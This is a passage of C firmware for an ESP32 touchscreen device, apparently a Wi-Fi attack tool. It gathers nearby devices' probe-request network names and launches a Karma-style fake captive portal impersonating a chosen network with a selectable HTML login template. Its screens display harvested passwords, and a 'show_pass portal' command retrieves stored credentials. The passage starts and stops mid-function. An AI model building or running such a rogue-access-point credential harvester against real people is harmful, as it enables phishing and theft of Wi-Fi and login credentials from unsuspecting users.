        lv_obj_clear_flag(internal_ctx.tiles, LV_OBJ_FLAG_HIDDEN);
        internal_ctx.current_visible_page = internal_ctx.tiles;
    }
}

static void adhoc_portal_stop_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Stopping captive portal from Ad Hoc Portal page");
    
    stop_captive_portal();
    portal_active = false;
    portal_background_mode = false;
    portal_started_by_uart = 0;
    
    update_portal_icon();
    
    // Refresh the page to show inactive state
    if (adhoc_portal_page) {
        lv_obj_del(adhoc_portal_page);
        adhoc_portal_page = NULL;
    }
    show_adhoc_portal_page();
}

// Fetch probes from all connected devices (Grove/USB and MBus)
// Helper function to parse probes from buffer - format: "1 SSID_Name" (number space SSID)
static void parse_probes_from_buffer(char *buffer, const char *source_tag)
{
    char *line = strtok(buffer, "\n\r");
    while (line != NULL && adhoc_probe_count < KARMA2_MAX_PROBES * 2) {
        // Skip leading whitespace
        char *p = line;
        while (*p == ' ') p++;
        
        // Check if line starts with a number (probe format: "1 SSID_Name")
        if (isdigit((unsigned char)*p)) {
            // Skip the number
            while (isdigit((unsigned char)*p)) p++;
            
            // Skip space(s) after number
            while (*p == ' ') p++;
            
            // Rest is SSID
            if (*p != '\0' && strlen(p) > 0) {
                char ssid[33] = {0};
                strncpy(ssid, p, sizeof(ssid) - 1);
                
                // Trim trailing whitespace
                size_t len = strlen(ssid);
                while (len > 0 && (ssid[len - 1] == '\r' || ssid[len - 1] == '\n' || 
                       ssid[len - 1] == ' ' || isspace((unsigned char)ssid[len - 1]))) {
                    ssid[--len] = '\0';
                }
                
                if (strlen(ssid) > 0) {
                    // Check for duplicates
                    bool duplicate = false;
                    for (int i = 0; i < adhoc_probe_count; i++) {
                        if (strcmp(adhoc_probes[i], ssid) == 0) {
                            duplicate = true;
                            break;
                        }
                    }
                    if (!duplicate) {
                        memset(adhoc_probes[adhoc_probe_count], 0, 33);
                        snprintf(adhoc_probes[adhoc_probe_count], 33, "%s", ssid);
                        ESP_LOGI(TAG, "[%s] Probe %d: %s", source_tag, adhoc_probe_count + 1, adhoc_probes[adhoc_probe_count]);
                        adhoc_probe_count++;
                    }
                }
            }
        }
        line = strtok(NULL, "\n\r");
    }
}

static void adhoc_fetch_probes_from_all_uarts(void)
{
    tab_id_t uart1_tab = uart1_preferred_tab();
    ESP_LOGI(TAG, "Fetching probes from all devices...");
    
    adhoc_probe_count = 0;
    memset(adhoc_probes, 0, sizeof(adhoc_probes));
    
    static char rx_buffer[2048];
    int total_len = 0;
    int retries = 0;
    
    // ========== Fetch from UART1 ==========
    uart_flush(UART_NUM);
    transport_write_bytes_tab(uart1_tab, UART_NUM, "list_probes\r\n", 13);
    ESP_LOGI(TAG, "[%s] Sent: list_probes", tab_transport_name(uart1_tab));
    
    vTaskDelay(pdMS_TO_TICKS(500));
    
    // Read with retries to get all data
    total_len = 0;
    retries = 10;
    while (retries-- > 0) {
        int len = transport_read_bytes_tab(uart1_tab, UART_NUM, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
        }
        if (len <= 0) break;
    }
    
    if (total_len > 0) {
        rx_buffer[total_len] = '\0';
        ESP_LOGI(TAG, "[%s] Received %d bytes", tab_transport_name(uart1_tab), total_len);
        ESP_LOGI(TAG, "[%s] Raw response:\n%s", tab_transport_name(uart1_tab), rx_buffer);
        
        // Parse probes using the same format as karma_show_probes_cb
        parse_probes_from_buffer(rx_buffer, tab_transport_name(uart1_tab));
    } else {
        ESP_LOGW(TAG, "[%s] No response received", tab_transport_name(uart1_tab));
    }
    
    // ========== Fetch from MBus if detected ==========
    if (mbus_detected && uart2_initialized) {
        ESP_LOGI(TAG, "Fetching probes from MBus");
        
        uart_flush(UART2_NUM);
        transport_write_bytes(UART2_NUM, "list_probes\r\n", 13);
        ESP_LOGI(TAG, "[MBus] Sent: list_probes");
        
        vTaskDelay(pdMS_TO_TICKS(500));
        
        // Read with retries to get all data
        total_len = 0;
        retries = 10;
        while (retries-- > 0) {
            int len = transport_read_bytes(UART2_NUM, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
            if (len > 0) {
                total_len += len;
            }
            if (len <= 0) break;
        }
        
        if (total_len > 0) {
            rx_buffer[total_len] = '\0';
            ESP_LOGI(TAG, "[MBus] Received %d bytes", total_len);
            ESP_LOGI(TAG, "[MBus] Raw response:\n%s", rx_buffer);
            
            // Parse probes using the same format as karma_show_probes_cb
            parse_probes_from_buffer(rx_buffer, "MBus");
        } else {
            ESP_LOGW(TAG, "[MBus] No response received");
        }
    }
    
    ESP_LOGI(TAG, "Total unique probes collected: %d", adhoc_probe_count);
}

static void adhoc_show_probes_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Show Probes button clicked on Ad Hoc Portal page");
    tab_id_t uart1_tab = uart1_preferred_tab();
    
    // Fetch probes from all available UARTs
    adhoc_fetch_probes_from_all_uarts();
    
    // Create popup overlay in internal container
    lv_obj_t *container = internal_container;
    if (!container) return;
    
    adhoc_probes_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(adhoc_probes_popup_overlay);
    lv_obj_set_size(adhoc_probes_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(adhoc_probes_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(adhoc_probes_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(adhoc_probes_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    
    adhoc_probes_popup_obj = lv_obj_create(adhoc_probes_popup_overlay);
    lv_obj_set_size(adhoc_probes_popup_obj, 400, 450);
    lv_obj_center(adhoc_probes_popup_obj);
    lv_obj_set_style_bg_color(adhoc_probes_popup_obj, lv_color_hex(0x2A2A2A), 0);
    lv_obj_set_style_border_color(adhoc_probes_popup_obj, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(adhoc_probes_popup_obj, 2, 0);
    lv_obj_set_style_radius(adhoc_probes_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(adhoc_probes_popup_obj, 15, 0);
    lv_obj_set_flex_flow(adhoc_probes_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(adhoc_probes_popup_obj, 10, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(adhoc_probes_popup_obj);
    lv_label_set_text(title, LV_SYMBOL_WIFI " Select Network (Probes)");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // Subtitle showing source
    lv_obj_t *subtitle = lv_label_create(adhoc_probes_popup_obj);
    if (mbus_detected) {
        lv_label_set_text_fmt(subtitle, "Found %d unique probes (%s + MBus)",
                              adhoc_probe_count, tab_transport_name(uart1_tab));
    } else {
        lv_label_set_text_fmt(subtitle, "Found %d probes (%s)", adhoc_probe_count, tab_transport_name(uart1_tab));
    }
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0x888888), 0);
    
    // Scrollable list
    lv_obj_t *list_container = lv_obj_create(adhoc_probes_popup_obj);
    lv_obj_set_size(list_container, lv_pct(100), 300);
    lv_obj_set_flex_grow(list_container, 1);
    lv_obj_set_style_bg_color(list_container, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(list_container, 0, 0);
    lv_obj_set_style_radius(list_container, 8, 0);
    lv_obj_set_style_pad_all(list_container, 8, 0);
    lv_obj_set_flex_flow(list_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(list_container, 6, 0);
    
    if (adhoc_probe_count == 0) {
        lv_obj_t *empty_label = lv_label_create(list_container);
        lv_label_set_text(empty_label, "No probes found.\nRun Network Observer first\nto collect probe requests.");
        lv_obj_set_style_text_font(empty_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(empty_label, lv_color_hex(0x666666), 0);
        lv_obj_set_style_text_align(empty_label, LV_TEXT_ALIGN_CENTER, 0);
    } else {
        for (int i = 0; i < adhoc_probe_count; i++) {
            lv_obj_t *btn = lv_btn_create(list_container);
            lv_obj_set_size(btn, lv_pct(100), 40);
            lv_obj_set_style_bg_color(btn, lv_color_hex(0x333333), 0);
            lv_obj_set_style_bg_color(btn, COLOR_MATERIAL_ORANGE, LV_STATE_PRESSED);
            lv_obj_set_style_radius(btn, 6, 0);
            lv_obj_add_event_cb(btn, adhoc_probe_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
            
            lv_obj_t *ssid_label = lv_label_create(btn);
            lv_label_set_text_fmt(ssid_label, "%d. %s", i + 1, adhoc_probes[i]);
            lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_14, 0);
            lv_obj_center(ssid_label);
        }
    }
    
    // Close button
    lv_obj_t *close_btn = lv_btn_create(adhoc_probes_popup_obj);
    lv_obj_set_size(close_btn, lv_pct(100), 45);
    lv_obj_set_style_bg_color(close_btn, lv_color_hex(0x444444), 0);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_add_event_cb(close_btn, adhoc_html_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *close_label = lv_label_create(close_btn);
    lv_label_set_text(close_label, "Close");
    lv_obj_set_style_text_font(close_label, &lv_font_montserrat_16, 0);
    lv_obj_center(close_label);
}

static void adhoc_probe_click_cb(lv_event_t *e)
{
    adhoc_selected_probe_idx = (int)(intptr_t)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "Selected probe: %s", adhoc_probes[adhoc_selected_probe_idx]);
    
    // Close probes popup
    if (adhoc_probes_popup_overlay) {
        lv_obj_del(adhoc_probes_popup_overlay);
        adhoc_probes_popup_overlay = NULL;
        adhoc_probes_popup_obj = NULL;
    }
    
    // Show HTML selection popup
    // Fetch HTML files from UART1 (SD card)
    karma2_fetch_html_files();
    
    lv_obj_t *container = internal_container;
    if (!container) return;
    
    adhoc_html_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(adhoc_html_popup_overlay);
    lv_obj_set_size(adhoc_html_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(adhoc_html_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(adhoc_html_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(adhoc_html_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    
    adhoc_html_popup_obj = lv_obj_create(adhoc_html_popup_overlay);
    lv_obj_set_size(adhoc_html_popup_obj, 400, 350);
    lv_obj_center(adhoc_html_popup_obj);
    lv_obj_set_style_bg_color(adhoc_html_popup_obj, lv_color_hex(0x2A2A2A), 0);
    lv_obj_set_style_border_color(adhoc_html_popup_obj, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(adhoc_html_popup_obj, 2, 0);
    lv_obj_set_style_radius(adhoc_html_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(adhoc_html_popup_obj, 20, 0);
    lv_obj_set_flex_flow(adhoc_html_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(adhoc_html_popup_obj, 15, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(adhoc_html_popup_obj);
    lv_label_set_text_fmt(title, "Start Portal: %s", adhoc_probes[adhoc_selected_probe_idx]);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_TEAL, 0);
    
    // HTML selection label
    lv_obj_t *html_label = lv_label_create(adhoc_html_popup_obj);
    lv_label_set_text(html_label, "Select portal HTML template:");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, lv_color_hex(0xCCCCCC), 0);
    
    // Dropdown for HTML files
    adhoc_html_dropdown = lv_dropdown_create(adhoc_html_popup_obj);
    lv_obj_set_width(adhoc_html_dropdown, lv_pct(100));
    lv_obj_set_style_bg_color(adhoc_html_dropdown, lv_color_hex(0x333333), 0);
    lv_obj_set_style_text_color(adhoc_html_dropdown, lv_color_hex(0xFFFFFF), 0);
    
    // Populate dropdown
    if (karma2_html_count > 0) {
        char options[512] = "";
        for (int i = 0; i < karma2_html_count; i++) {
            if (i > 0) strcat(options, "\n");
            strncat(options, karma2_html_files[i], sizeof(options) - strlen(options) - 1);
        }
        lv_dropdown_set_options(adhoc_html_dropdown, options);
    } else {
        lv_dropdown_set_options(adhoc_html_dropdown, "default.html");
    }
    
    // Button container
    lv_obj_t *btn_cont = lv_obj_create(adhoc_html_popup_obj);
    lv_obj_set_size(btn_cont, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_cont, 0, 0);
    lv_obj_set_style_pad_all(btn_cont, 0, 0);
    lv_obj_set_flex_flow(btn_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_cont, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(btn_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(cancel_btn, 150, 50);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x444444), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_add_event_cb(cancel_btn, adhoc_html_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_label, "Cancel");
    lv_obj_set_style_text_font(cancel_label, &lv_font_montserrat_16, 0);
    lv_obj_center(cancel_label);
    
    // Start button
    lv_obj_t *start_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(start_btn, 150, 50);
    lv_obj_set_style_bg_color(start_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_radius(start_btn, 8, 0);
    lv_obj_add_event_cb(start_btn, adhoc_html_select_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *start_label = lv_label_create(start_btn);
    lv_label_set_text(start_label, LV_SYMBOL_PLAY " Start");
    lv_obj_set_style_text_font(start_label, &lv_font_montserrat_16, 0);
    lv_obj_center(start_label);
}

static void adhoc_html_popup_close_cb(lv_event_t *e)
{
    (void)e;
    
    if (adhoc_probes_popup_overlay) {
        lv_obj_del(adhoc_probes_popup_overlay);
        adhoc_probes_popup_overlay = NULL;
        adhoc_probes_popup_obj = NULL;
    }
    
    if (adhoc_html_popup_overlay) {
        lv_obj_del(adhoc_html_popup_overlay);
        adhoc_html_popup_overlay = NULL;
        adhoc_html_popup_obj = NULL;
        adhoc_html_dropdown = NULL;
    }
}

static void adhoc_html_select_cb(lv_event_t *e)
{
    (void)e;
    
    // Get selected HTML file
    int html_idx = lv_dropdown_get_selected(adhoc_html_dropdown);
    const char *ssid = adhoc_probes[adhoc_selected_probe_idx];
    
    if (karma2_html_count > 0 && html_idx < karma2_html_count) {
        strncpy(portal_selected_html, karma2_html_files[html_idx], sizeof(portal_selected_html) - 1);
    } else {
        strcpy(portal_selected_html, "default.html");
    }
    
    ESP_LOGI(TAG, "Starting captive portal - SSID: %s, HTML: %s", ssid, portal_selected_html);
    
    // Close HTML popup
    adhoc_html_popup_close_cb(e);
    
    // Start captive portal on built-in C6
    esp_err_t err = start_captive_portal(ssid);
    if (err == ESP_OK) {
        portal_active = true;
        portal_background_mode = true;
        
        // Refresh the Ad Hoc Portal page to show active state
        if (adhoc_portal_page) {
            lv_obj_del(adhoc_portal_page);
            adhoc_portal_page = NULL;
        }
        show_adhoc_portal_page();
    } else {
        ESP_LOGE(TAG, "Failed to start captive portal: %s", esp_err_to_name(err));
    }
}

static void show_adhoc_portal_page(void)
{
    ESP_LOGI(TAG, "Showing Ad Hoc Portal page, portal_active=%d", portal_active);
    
    lv_obj_t *container = internal_container;
    if (!container) {
        ESP_LOGE(TAG, "Internal container not initialized!");
        return;
    }
    
    // Hide tiles
    if (internal_ctx.tiles) {
        lv_obj_add_flag(internal_ctx.tiles, LV_OBJ_FLAG_HIDDEN);
    }
    
    // If page exists, just show it
    if (adhoc_portal_page) {
        lv_obj_clear_flag(adhoc_portal_page, LV_OBJ_FLAG_HIDDEN);
        internal_ctx.current_visible_page = adhoc_portal_page;
        return;
    }
    
    // Create page
    adhoc_portal_page = lv_obj_create(container);
    lv_obj_set_size(adhoc_portal_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(adhoc_portal_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(adhoc_portal_page, 0, 0);
    lv_obj_set_style_pad_all(adhoc_portal_page, 15, 0);
    lv_obj_set_flex_flow(adhoc_portal_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(adhoc_portal_page, 10, 0);
    
    // Header with back button
    lv_obj_t *header = lv_obj_create(adhoc_portal_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 15, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, adhoc_portal_back_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Ad Hoc Portal & Karma");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // =====================================================
    // PORTAL ACTIVE VIEW
    // =====================================================
    if (portal_active) {
        ESP_LOGI(TAG, "Portal is ACTIVE, showing status view");
        
        // Status box
        lv_obj_t *status_box = lv_obj_create(adhoc_portal_page);
        lv_obj_set_size(status_box, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(status_box, lv_color_hex(0x1B5E20), 0);  // Dark green
        lv_obj_set_style_border_width(status_box, 0, 0);
        lv_obj_set_style_radius(status_box, 8, 0);
        lv_obj_set_style_pad_all(status_box, 15, 0);
        lv_obj_set_flex_flow(status_box, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_style_pad_row(status_box, 5, 0);
        lv_obj_clear_flag(status_box, LV_OBJ_FLAG_SCROLLABLE);
        
        lv_obj_t *status_title = lv_label_create(status_box);
        lv_label_set_text(status_title, LV_SYMBOL_OK " Portal Active");
        lv_obj_set_style_text_font(status_title, &lv_font_montserrat_18, 0);
        lv_obj_set_style_text_color(status_title, COLOR_MATERIAL_GREEN, 0);
        
        // SSID
        lv_obj_t *ssid_label = lv_label_create(status_box);
        lv_label_set_text_fmt(ssid_label, "SSID: %s", portal_ssid ? portal_ssid : "Unknown");
        lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
        
        // HTML file
        lv_obj_t *html_label = lv_label_create(status_box);
        lv_label_set_text_fmt(html_label, "HTML: %s", strlen(portal_selected_html) > 0 ? portal_selected_html : "default");
        lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(html_label, lv_color_hex(0xCCCCCC), 0);
        
        // Started by
        lv_obj_t *started_label = lv_label_create(status_box);
        lv_label_set_text_fmt(started_label, "Started by: %s", 
            portal_started_by_uart == 1 ? tab_transport_name(uart1_preferred_tab()) : 
            portal_started_by_uart == 2 ? "MBus" : "Internal");
        lv_obj_set_style_text_font(started_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(started_label, lv_color_hex(0xAAAAAA), 0);
        
        // Data container (shows client connections, passwords)
        lv_obj_t *data_box = lv_obj_create(adhoc_portal_page);
        lv_obj_set_size(data_box, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_flex_grow(data_box, 1);
        lv_obj_set_style_bg_color(data_box, lv_color_hex(0x252525), 0);
        lv_obj_set_style_border_width(data_box, 0, 0);
        lv_obj_set_style_radius(data_box, 8, 0);
        lv_obj_set_style_pad_all(data_box, 15, 0);
        
        adhoc_portal_data_label = lv_label_create(data_box);
        lv_label_set_text(adhoc_portal_data_label, "Waiting for client connections...\n\nPasswords will appear here.");
        lv_obj_set_style_text_font(adhoc_portal_data_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(adhoc_portal_data_label, lv_color_hex(0x888888), 0);
        lv_label_set_long_mode(adhoc_portal_data_label, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(adhoc_portal_data_label, lv_pct(100));
        
        // Also update karma2_attack_status_label to point here for HTTP handler updates
        karma2_attack_status_label = adhoc_portal_data_label;
        
        // STOP button
        lv_obj_t *stop_btn = lv_btn_create(adhoc_portal_page);
        lv_obj_set_size(stop_btn, lv_pct(100), 55);
        lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
        lv_obj_set_style_radius(stop_btn, 8, 0);
        lv_obj_add_event_cb(stop_btn, adhoc_portal_stop_cb, LV_EVENT_CLICKED, NULL);
        
        lv_obj_t *stop_label = lv_label_create(stop_btn);
        lv_label_set_text(stop_label, LV_SYMBOL_CLOSE " STOP PORTAL");
        lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_18, 0);
        lv_obj_center(stop_label);
        
    } else {
        // =====================================================
        // PORTAL INACTIVE VIEW
        // =====================================================
        ESP_LOGI(TAG, "Portal is INACTIVE, showing probe selection view");
        
        // Info box
        lv_obj_t *info_box = lv_obj_create(adhoc_portal_page);
        lv_obj_set_size(info_box, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(info_box, lv_color_hex(0x252525), 0);
        lv_obj_set_style_border_width(info_box, 0, 0);
        lv_obj_set_style_radius(info_box, 8, 0);
        lv_obj_set_style_pad_all(info_box, 15, 0);
        lv_obj_clear_flag(info_box, LV_OBJ_FLAG_SCROLLABLE);
        
        lv_obj_t *info_label = lv_label_create(info_box);
        int device_count = (grove_detected ? 1 : 0) + (usb_detected ? 1 : 0) + (mbus_detected ? 1 : 0);
        if (device_count > 1) {
            lv_label_set_text(info_label,
                "Start a Karma captive portal using probe requests\n"
                "collected by Network Observer.\n\n"
                "Probes from all connected devices will be\n"
                "combined (duplicates removed).");
        } else {
            lv_label_set_text(info_label,
                "Start a Karma captive portal using probe requests\n"
                "collected by Network Observer.");
        }
        lv_obj_set_style_text_font(info_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(info_label, lv_color_hex(0xAAAAAA), 0);
        lv_label_set_long_mode(info_label, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(info_label, lv_pct(100));
        
        // Show Probes button (NO Start/Stop Sniffer buttons!)
        lv_obj_t *probes_btn = lv_btn_create(adhoc_portal_page);
        lv_obj_set_size(probes_btn, lv_pct(100), 55);
        lv_obj_set_style_bg_color(probes_btn, COLOR_MATERIAL_CYAN, 0);
        lv_obj_set_style_radius(probes_btn, 8, 0);
        lv_obj_add_event_cb(probes_btn, adhoc_show_probes_cb, LV_EVENT_CLICKED, NULL);
        
        lv_obj_t *probes_label = lv_label_create(probes_btn);
        lv_label_set_text(probes_label, LV_SYMBOL_LIST " Show Probes");
        lv_obj_set_style_text_font(probes_label, &lv_font_montserrat_18, 0);
        lv_obj_center(probes_label);
        
        // Status label
        adhoc_portal_status_label = lv_label_create(adhoc_portal_page);
        lv_label_set_text(adhoc_portal_status_label, "Select a probe request to start captive portal");
        lv_obj_set_style_text_font(adhoc_portal_status_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(adhoc_portal_status_label, lv_color_hex(0x888888), 0);
    }
    
    internal_ctx.current_visible_page = adhoc_portal_page;
}

//==================================================================================
// Portal Data Page
//==================================================================================

static void show_portal_data_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    hide_all_pages(ctx);
    
    // Delete and recreate to refresh data
    if (ctx->portal_data_page) {
        lv_obj_del(ctx->portal_data_page);
        ctx->portal_data_page = NULL;
    }
    
    // Create page
    ctx->portal_data_page = lv_obj_create(container);
    lv_coord_t scr_height = lv_disp_get_ver_res(NULL);
    lv_obj_set_size(ctx->portal_data_page, lv_pct(100), scr_height - 85);
    lv_obj_align(ctx->portal_data_page, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(ctx->portal_data_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(ctx->portal_data_page, 0, 0);
    lv_obj_set_style_pad_all(ctx->portal_data_page, 10, 0);
    lv_obj_set_flex_flow(ctx->portal_data_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->portal_data_page, 8, 0);
    
    ctx->current_visible_page = ctx->portal_data_page;
    
    // Header
    lv_obj_t *header = lv_obj_create(ctx->portal_data_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 12, 0);
    
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, compromised_data_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Portal Data");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_TEAL, 0);
    
    // Status label
    lv_obj_t *status_label = lv_label_create(ctx->portal_data_page);
    lv_label_set_text(status_label, "Loading...");
    lv_obj_set_style_text_font(status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(status_label, lv_color_hex(0x888888), 0);
    
    // Scrollable list container
    lv_obj_t *list_container = lv_obj_create(ctx->portal_data_page);
    lv_obj_set_size(list_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(list_container, 1);
    lv_obj_set_style_bg_color(list_container, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(list_container, 0, 0);
    lv_obj_set_style_radius(list_container, 8, 0);
    lv_obj_set_style_pad_all(list_container, 10, 0);
    lv_obj_set_flex_flow(list_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(list_container, 8, 0);
    
    // Flush RX buffer to clear any boot messages from ESP32C5
    uart_port_t uart_port = uart_port_for_tab(current_tab);
    uart_flush_input(uart_port);
    
    // Send UART command and read response
    uart_send_command_for_tab("show_pass portal");
    vTaskDelay(pdMS_TO_TICKS(1000));  // Wait for ESP32C5 to process and read from SD
    
    static char rx_buffer[4096];
    int total_len = 0;
    int retries = 10;
    int empty_reads = 0;
    
    while (retries-- > 0 && empty_reads < 3) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
            empty_reads = 0;  // Reset on successful read
        } else {
            empty_reads++;  // Only break after 3 consecutive empty reads
        }
    }
    rx_buffer[total_len] = '\0';
    
    ESP_LOGI(TAG, "Portal data response (%d bytes): %s", total_len, rx_buffer);
    
    // Parse response - format: "SSID", "field1=val1", "field2=val2"...
    int entry_count = 0;
    char *line = strtok(rx_buffer, "\n\r");
    while (line != NULL) {
        // Skip empty lines and command echo
        if (strlen(line) < 5 || strstr(line, "show_pass") != NULL) {
            line = strtok(NULL, "\n\r");
            continue;
        }
        
        // Parse quoted strings
        char ssid[64] = {0};
        char fields[512] = {0};
        int field_count = 0;
        
        char *p = line;
        char *quote_start = NULL;
        bool first_field = true;
        
        while ((quote_start = strchr(p, '"')) != NULL) {
            quote_start++;
            char *quote_end = strchr(quote_start, '"');
            if (!quote_end) break;
            
            size_t len = quote_end - quote_start;
            char field[128] = {0};
            if (len < sizeof(field)) {
                strncpy(field, quote_start, len);
